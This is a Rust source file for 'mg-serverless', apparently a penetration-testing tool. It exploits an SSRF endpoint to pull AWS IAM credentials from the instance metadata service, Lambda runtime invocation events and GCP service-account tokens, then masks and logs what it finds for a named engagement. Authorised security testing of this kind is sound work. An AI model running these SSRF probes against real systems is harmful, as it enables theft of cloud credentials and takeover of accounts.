/*******************************************************************
 * Filename:        main.rs
 * Author:          Jeff
 * Date:            2026-05-18
 * Description:     mg-serverless — serverless environment metadata probe via SSRF.
 * Notes:           Each metadata URL is appended as a query parameter value to --ssrf-url.
 *                  Sensitive fields (credentials, tokens) are masked in output.
 *                  HIGH finding is emitted if credentials or runtime event are exposed.
 *                  GCP metadata requires the "Metadata-Flavor: Google" header which
 *                  must be injected by the SSRF target — we note this in the finding.
 *******************************************************************/

use std::fs;
use std::path::Path;
use std::time::Duration;

use anyhow::{Context, Result};
use clap::Parser;
use serde::{Deserialize, Serialize};
use time::OffsetDateTime;
use time::format_description::well_known::Rfc3339;
use url::Url;

use engagement::Engagement;

// ── Constants ────────────────────────────────────────────────────────────────

const OUTPUT_SUBDIR: &str = "serverless";
const OUTPUT_FILE_PREFIX: &str = "results-";
const AUDIT_TOOL: &str = "mg-serverless";
const DEFAULT_TIMEOUT_SECS: u64 = 15;

// AWS IMDS endpoints
const AWS_CRED_LIST_PATH: &str =
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/";
const AWS_LAMBDA_RUNTIME_PATH: &str =
    "http://127.0.0.1:9001/2018-06-01/runtime/invocation/next";
// GCP metadata endpoint — requires Metadata-Flavor: Google header (injected by target)
const GCP_TOKEN_PATH: &str =
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token";

// Mask: show only first N characters of sensitive strings
const MASK_VISIBLE_CHARS: usize = 4;

// ── CLI ──────────────────────────────────────────────────────────────────────

#[derive(Parser, Debug)]
#[command(
    name = "mg-serverless",
    about = "Serverless environment metadata probe via SSRF endpoint"
)]
struct Args {
    /// Engagement name
    engagement: String,

    /// Engagements root directory
    #[arg(long, env = "MG_ENGAGEMENTS_DIR", default_value = "engagements")]
    engagements_dir: String,

    /// SSRF endpoint URL — metadata URL is appended as a query parameter value
    #[arg(long)]
    ssrf_url: String,

    /// HTTP timeout in seconds
    #[arg(long, default_value_t = DEFAULT_TIMEOUT_SECS)]
    timeout: u64,
}

// ── Data types ───────────────────────────────────────────────────────────────

// Severity of a finding
#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "UPPERCASE")]
enum Severity {
    High,
}

// One probe result
#[derive(Debug, Serialize)]
struct ProbeResult {
    label: String,
    metadata_url: String,
    ssrf_url: String,
    accessible: bool,
    severity: Option<Severity>,
    detail: String,
    masked_value: Option<String>,
}

// AWS IAM creds JSON shape
#[derive(Debug, Deserialize)]
struct AwsCreds {
    #[serde(rename = "AccessKeyId", default)]
    access_key_id: String,
    #[serde(rename = "SecretAccessKey", default)]
    secret_access_key: String,
    #[serde(rename = "Token", default)]
    token: String,
    #[serde(rename = "Expiration", default)]
    expiration: String,
}

// Top-level output
#[derive(Serialize)]
struct ServerlessResults {
    engagement: String,
    timestamp: String,
    ssrf_url: String,
    is_lambda: bool,
    probes: Vec<ProbeResult>,
}

// ── Helpers ───────────────────────────────────────────────────────────────────

// Mask a sensitive string — keep first N chars, replace rest with *
fn mask_value(val: &str) -> String {
    if val.len() <= MASK_VISIBLE_CHARS {
        return "*".repeat(val.len());
    }
    let visible = &val[..MASK_VISIBLE_CHARS];
    format!("{visible}{}", "*".repeat(val.len() - MASK_VISIBLE_CHARS))
}

// Build the SSRF probe URL by appending the metadata URL as a query param
fn build_ssrf_probe(ssrf_url: &str, metadata_url: &str) -> Result<String> {
    let mut parsed = Url::parse(ssrf_url).context("parse ssrf-url")?;
    parsed
        .query_pairs_mut()
        .append_pair("url", metadata_url);
    Ok(parsed.to_string())
}

// ── Probe logic ───────────────────────────────────────────────────────────────

// Probe the AWS IMDS credential list endpoint via SSRF
async fn probe_aws_cred_list(
    client: &reqwest::Client,
    ssrf_base: &str,
) -> Result<(bool, Option<String>)> {
    let probe_url = build_ssrf_probe(ssrf_base, AWS_CRED_LIST_PATH)?;
    let resp = client.get(&probe_url).send().await;
    let Ok(resp) = resp else {
        return Ok((false, None));
    };
    if !resp.status().is_success() {
        return Ok((false, None));
    }
    let body = resp.text().await.unwrap_or_default();
    let trimmed = body.trim().to_string();
    if trimmed.is_empty() {
        return Ok((false, None));
    }
    Ok((true, Some(trimmed)))
}

// Probe AWS IMDS for credentials of a specific role
async fn probe_aws_creds(
    client: &reqwest::Client,
    ssrf_base: &str,
    role_name: &str,
) -> Option<AwsCreds> {
    let metadata_url = format!("{AWS_CRED_LIST_PATH}{role_name}");
    let probe_url = build_ssrf_probe(ssrf_base, &metadata_url).ok()?;
    let resp = client.get(&probe_url).send().await.ok()?;
    if !resp.status().is_success() {
        return None;
    }
    resp.json::<AwsCreds>().await.ok()
}

// Probe Lambda runtime invocation endpoint via SSRF
async fn probe_lambda_runtime(client: &reqwest::Client, ssrf_base: &str) -> (bool, String) {
    let Ok(probe_url) = build_ssrf_probe(ssrf_base, AWS_LAMBDA_RUNTIME_PATH) else {
        return (false, String::new());
    };
    let resp = client.get(&probe_url).send().await;
    let Ok(resp) = resp else {
        return (false, String::new());
    };
    if !resp.status().is_success() {
        return (false, String::new());
    }
    let body = resp.text().await.unwrap_or_default();
    (!body.is_empty(), body)
}

// Probe GCP metadata service for a service account token via SSRF
async fn probe_gcp_token(client: &reqwest::Client, ssrf_base: &str) -> (bool, String) {
    let Ok(probe_url) = build_ssrf_probe(ssrf_base, GCP_TOKEN_PATH) else {
        return (false, String::new());
    };
    let resp = client.get(&probe_url).send().await;
    let Ok(resp) = resp else {
        return (false, String::new());
    };
    if !resp.status().is_success() {
        return (false, String::new());
    }
    let body = resp.text().await.unwrap_or_default();
    (!body.is_empty(), body)
}

// ── Entry point ───────────────────────────────────────────────────────────────

#[tokio::main]
async fn main() -> Result<()> {
    let args = Args::parse();

    let eng = Engagement::load_named(Path::new(&args.engagements_dir), &args.engagement)
        .with_context(|| format!("load engagement {}", args.engagement))?;

    eprintln!("mg-serverless: ssrf_url={}", args.ssrf_url);

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(args.timeout))
        .user_agent("mg-serverless/0.1")
        .build()
        .context("build HTTP client")?;

    let mut probes: Vec<ProbeResult> = Vec::new();
    let mut is_lambda = false;

    // AWS: probe credential list to get role name
    eprintln!("  probing AWS IMDS cred list...");
    let (cred_list_accessible, role_name) =
        probe_aws_cred_list(&client, &args.ssrf_url).await.unwrap_or((false, None));

    if cred_list_accessible {
        let role = role_name.as_deref().unwrap_or("").to_string();
        eprintln!("  Lambda IAM role: {role}");
        is_lambda = !role.is_empty();

        // Try to fetch the actual credentials
        if let Some(creds) = probe_aws_creds(&client, &args.ssrf_url, &role).await {
            let masked = format!(
                "AccessKeyId={} SecretAccessKey={} Token={} Expires={}",
                mask_value(&creds.access_key_id),
                mask_value(&creds.secret_access_key),
                mask_value(&creds.token),
                creds.expiration,
            );
            eprintln!("  [HIGH] AWS credentials exposed: {masked}");
            probes.push(ProbeResult {
                label: "AWS IAM Credentials".to_string(),
                metadata_url: format!("{AWS_CRED_LIST_PATH}{role}"),
                ssrf_url: build_ssrf_probe(&args.ssrf_url, &format!("{AWS_CRED_LIST_PATH}{role}"))
                    .unwrap_or_default(),
                accessible: true,
                severity: Some(Severity::High),
                detail: "Temporary IAM credentials retrieved via SSRF".to_string(),
                masked_value: Some(masked),
            });
        } else {
            probes.push(ProbeResult {
                label: "AWS IAM Role Name".to_string(),
                metadata_url: AWS_CRED_LIST_PATH.to_string(),
                ssrf_url: build_ssrf_probe(&args.ssrf_url, AWS_CRED_LIST_PATH).unwrap_or_default(),
                accessible: true,
                severity: Some(Severity::High),
                detail: format!("IAM role name exposed: {role}"),
                masked_value: None,
            });
        }
    } else {
        probes.push(ProbeResult {
            label: "AWS IAM Role List".to_string(),
            metadata_url: AWS_CRED_LIST_PATH.to_string(),
            ssrf_url: build_ssrf_probe(&args.ssrf_url, AWS_CRED_LIST_PATH).unwrap_or_default(),
            accessible: false,
            severity: None,
            detail: "Not accessible".to_string(),
            masked_value: None,
        });
    }

    // Lambda runtime invocation API
    eprintln!("  probing Lambda runtime API...");
    let (runtime_accessible, runtime_body) =
        probe_lambda_runtime(&client, &args.ssrf_url).await;

    if runtime_accessible {
        eprintln!("  [HIGH] Lambda runtime event exposed");
        let preview: String = runtime_body.chars().take(200).collect();
        probes.push(ProbeResult {
            label: "Lambda Runtime Invocation".to_string(),
            metadata_url: AWS_LAMBDA_RUNTIME_PATH.to_string(),
            ssrf_url: build_ssrf_probe(&args.ssrf_url, AWS_LAMBDA_RUNTIME_PATH)
                .unwrap_or_default(),
            accessible: true,
            severity: Some(Severity::High),
            detail: "Lambda pending invocation event exposed via SSRF".to_string(),
            masked_value: Some(preview),
        });
    } else {
        probes.push(ProbeResult {
            label: "Lambda Runtime Invocation".to_string(),
            metadata_url: AWS_LAMBDA_RUNTIME_PATH.to_string(),
            ssrf_url: build_ssrf_probe(&args.ssrf_url, AWS_LAMBDA_RUNTIME_PATH)
                .unwrap_or_default(),
            accessible: false,
            severity: None,
            detail: "Not accessible".to_string(),
            masked_value: None,
        });
    }

    // GCP metadata service
    eprintln!("  probing GCP metadata service...");
    let (gcp_accessible, gcp_body) = probe_gcp_token(&client, &args.ssrf_url).await;

    if gcp_accessible {
        eprintln!("  [HIGH] GCP service account token exposed");
        probes.push(ProbeResult {
            label: "GCP Service Account Token".to_string(),
            metadata_url: GCP_TOKEN_PATH.to_string(),
            ssrf_url: build_ssrf_probe(&args.ssrf_url, GCP_TOKEN_PATH).unwrap_or_default(),
            accessible: true,
            severity: Some(Severity::High),
            detail: "GCP SA token exposed via SSRF (note: requires Metadata-Flavor: Google header from target)".to_string(),
            masked_value: Some(mask_value(gcp_body.trim())),
        });
    } else {
        probes.push(ProbeResult {
            label: "GCP Service Account Token".to_string(),
            metadata_url: GCP_TOKEN_PATH.to_string(),
            ssrf_url: build_ssrf_probe(&args.ssrf_url, GCP_TOKEN_PATH).unwrap_or_default(),
            accessible: false,
            severity: None,
            detail: "Not accessible".to_string(),
            masked_value: None,
        });
    }

    // Write output
    let out_dir = eng.root.join(OUTPUT_SUBDIR);
    fs::create_dir_all(&out_dir).context("create serverless output dir")?;
    let ts = OffsetDateTime::now_utc().format(&Rfc3339)?;
    let ts_file = ts.replace(':', "-").replace('+', "Z");
    let out_path = out_dir.join(format!("{OUTPUT_FILE_PREFIX}{ts_file}.json"));

    let output = ServerlessResults {
        engagement: args.engagement.clone(),
        timestamp: ts,
        ssrf_url: args.ssrf_url.clone(),
        is_lambda,
        probes,
    };
    let json = serde_json::to_string_pretty(&output)?;
    fs::write(&out_path, &json).context("write results JSON")?;
    println!("[*] Results written to {}", out_path.display());

    let _ = eng.audit(AUDIT_TOOL, &args.ssrf_url, None);

    Ok(())
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn mask_value_masks_all_but_first_four() {
        let masked = mask_value("AKIAIOSFODNN7EXAMPLE");
        assert!(masked.starts_with("AKIA"));
        assert!(masked.contains('*'));
        assert_eq!(masked.len(), "AKIAIOSFODNN7EXAMPLE".len());
    }

    #[test]
    fn mask_value_short_string_fully_masked() {
        let masked = mask_value("abc");
        assert_eq!(masked, "***");
    }

    #[test]
    fn build_ssrf_probe_appends_url_param() {
        let ssrf = "https://victim.com/proxy?redirect=";
        let metadata = "http://169.254.169.254/latest/meta-data/";
        let probe = build_ssrf_probe(ssrf, metadata).unwrap();
        assert!(probe.contains("url="));
        assert!(probe.contains("169.254.169.254"));
    }

    #[test]
    fn build_ssrf_probe_rejects_invalid_url() {
        let result = build_ssrf_probe("not a url", "http://meta");
        assert!(result.is_err());
    }
}
